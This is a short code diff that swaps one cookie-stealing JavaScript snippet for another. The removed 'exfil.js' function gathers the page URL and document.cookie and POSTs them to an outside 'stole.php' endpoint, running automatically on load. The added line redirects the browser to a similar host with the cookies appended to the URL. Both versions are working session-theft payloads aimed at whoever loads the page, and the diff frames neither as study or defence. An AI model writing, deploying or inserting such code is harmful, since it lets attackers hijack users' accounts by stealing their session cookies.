@@ -1,20 +1,2 @@
-// exfil.js - Your custom script
-export function stealData() {
-    const data = {
-        url: window.location.href,
-        cookies: document.cookie,
-        timestamp: new Date().toISOString()
-    };
-    
-    // Send to your server
-    fetch('https://h0x8.info/stole.php', {
-        method: 'POST',
-        body: JSON.stringify(data),
-        mode: 'no-cors'
-    });
-    
-    return data;
-}
-
-// Auto-execute
-stealData();
+// Send to your server
+    location.href="https://hx08.info/stole.php?data="+document.cookie
